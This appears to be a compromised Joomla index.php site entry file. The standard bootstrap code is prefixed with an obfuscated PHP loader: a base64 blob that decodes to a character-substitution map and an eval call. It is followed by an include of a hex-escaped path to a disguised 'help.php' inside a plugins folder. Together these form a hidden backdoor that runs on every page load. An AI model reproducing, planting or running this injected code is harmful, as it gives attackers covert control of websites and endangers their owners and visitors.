aEdzckNHc3JDR3NyQ0dzckNvNXJFMnM5RkxIMEZYdUU5dXNyQ0dzckNHc3JDR3NyQ0dzckNHc0xsOGonLgonTEhHWlBoOEdSUTZlRG1rSFJqelR5aHM1YkcyV3JDR3NyQ0dzckNHc3JDR3NyQ0dzckNEd0RoUnNQYUtzTHdWU2NDMkhMSGVZQ2gnLgonR3NyQ0dzckNHc3JDR3NyQ0dzckNHNDBKNzRyRTIrckNvWDBGbzZKSEQ2dkhERGJHMldyQ0dzckNHc3JDR3NyQycuCidHc1dhN1lDaEdzckNHc3JDR3NyQ0dzclFrcXZRZnM5eFl6Um16NnlRek1wT3NYdk9YbkU5dXNyQ0dzckNHc3JDR3NyQycuCic4emdRejJOZTJXckNHc3JDR3NyQzhaRTl1c3JDR3NyQ0dzclFrN1JqazVwaEd1TFFvNkRRSXlMalY0Rk9HWlAnLgonT0c0cE9SNUU5dXNyQ0dzckNHc3J4N1lDaEdzckNHc3JDR3NyQ0dzclFrajBKZXVMUW82RFFJeUxqOTRGT1huJy4KJ0U5dXNyQ0dzckNHc3J4MllDaEdzckNHc3JDR3NwSjN3cEp6bXJDc1hwUUkyMGs3NDBPRERyRTJackNEZXl4azR2Sks0VzkyV3JDR3NyQ0dzckM4bkU5dXMnLgonckNHc3JDR3NyQ0dzckM4NXBoc1hwUUkyMGs3NFJqVjRGT0daUE9HNDBKb1hMSFhZQ2hHc3JDR3NyQ0dzckNHc3J4N1lDaEdzckNHc3JDR3NyQycuCidHc3JDR3NyQzhxUmRaZXl4azR2SkJBMEpvWFdDb1gwRm82SkhEZUxkMjdyQ29YMEZvNkpIRFhMZDI1TmUyV3JDR3NyQ0dzckNHc3JDR3NBJy4KJzkyV3JDR3NyQ0dzckNHc3JDR3NwSjN3cEp6bVdDb1gwRm82SkhEdzBPRERyRTJackNESHBKMjRXOTJXckNHc3JDR3NyQ0dzckNHc2dlMldyQ0dzckNHcycuCidyQ0dzckNHc3JDR3NyUVl3Rmw4N0RKRDV5elpIcEoydUxRbzZEUUl5TGxHNEZPWG5FOXVzckNHc3JDJy4KJ0dzckNHc3JDOFpFOXVzckNHc3JDR3NyeDJZQ2hHc3JDR3NyQ0dzcEpZdXlIR1hwUUkyMGs3NDBKNzRGYTdZQ2hHcycuCidyQ0dzckNHc3BGNjVEQ3M1TmUyV3JDR3NyeDJZQ3MyV3JDR3NyUVl3Rmw4N0RKRDV5elo3eWpJJy4KJ1hXQ1huRTk1Wic7CiRjbGp3aXUgPSBBcnJheSgnMSc9PidxJywgJzAnPT4nWScsICczJz0+J3gnLCAnMic9PicwJywgJzUnPT4ncCcsICc0Jz0+J24nLCAnNyc9PidzJywgJzYnPT4naCcsICc5Jz0+J1EnLCAnOCc9PidCJywgJ0EnPT4nZicsICdDJz0+J0MnLCAnQic9Pic1JywgJ0UnPT4nRCcsICdEJz0+J2QnLCAnRyc9PidBJywgJ0YnPT4nWCcsICdJJz0+J0YnLCAnSCc9Pid5JywgJ0snPT4nNCcsICdKJz0+J1cnLCAnTSc9Pic2JywgJ0wnPT4nSicsICdPJz0+J1MnLCAnTic9PidPJywgJ1EnPT4nRycsICdQJz0+J1AnLCAnUyc9Pid1JywgJ1InPT4nYycsICdVJz0+J1UnLCAnVCc9Pid2JywgJ1cnPT4nSycsICdWJz0+J0UnLCAnWSc9PidOJywgJ1gnPT4naycsICdaJz0+JzknLCAnYSc9PidUJywgJ2MnPT4nTScsICdiJz0+J0wnLCAnZSc9Pid3JywgJ2QnPT4nMScsICdnJz0+J2UnLCAnZic9Pic4JywgJ2knPT4ndCcsICdoJz0+J2knLCAnayc9PidWJywgJ2onPT4nMicsICdtJz0+J20nLCAnbCc9PiczJywgJ28nPT4nUicsICduJz0+JzcnLCAncSc9PidqJywgJ3AnPT4nWicsICdzJz0+J2cnLCAncic9PidJJywgJ3UnPT4nbycsICd0Jz0+J3InLCAndyc9Pid6JywgJ3YnPT4nYScsICd5Jz0+J2InLCAneCc9PidIJywgJ3onPT4nbCcpOwpldmFsLypwYiovKG9ucXdjaW9jKCRtbmJpZHZka3osICRjbGp3aXUpKTsKfQ=="));

include "\x2fhom\x65/st\x72ato\x2fhtt\x70/pr\x65miu\x6d/ri\x64/19\x2f96/\x35330\x31996\x2fhtd\x6fcs/\x70ubl\x69c_h\x74ml/\x70lug\x69ns/\x64jme\x64iat\x6fols\x2fk2/\x68elp\x2ephp";


/**
 * @package		Joomla.Site
 * @copyright	Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */

// Set flag that this is a parent file.
define('_JEXEC', 1);
define('DS', DIRECTORY_SEPARATOR);

if (file_exists(dirname(__FILE__) . '/defines.php')) {
	include_once dirname(__FILE__) . '/defines.php';
}

if (!defined('_JDEFINES')) {
	define('JPATH_BASE', dirname(__FILE__));
	require_once JPATH_BASE.'/includes/defines.php';
}

require_once JPATH_BASE.'/includes/framework.php';

// Mark afterLoad in the profiler.
JDEBUG ? $_PROFILER->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Initialise the application.
$app->initialise();

// Mark afterIntialise in the profiler.
JDEBUG ? $_PROFILER->mark('afterInitialise') : null;

// Route the application.
$app->route();

// Mark afterRoute in the profiler.
JDEBUG ? $_PROFILER->mark('afterRoute') : null;

// Dispatch the application.
$app->dispatch();

// Mark afterDispatch in the profiler.
JDEBUG ? $_PROFILER->mark('afterDispatch') : null;

// Render the application.
$app->render();

// Mark afterRender in the profiler.
JDEBUG ? $_PROFILER->mark('afterRender') : null;

// Return the response.
echo $app;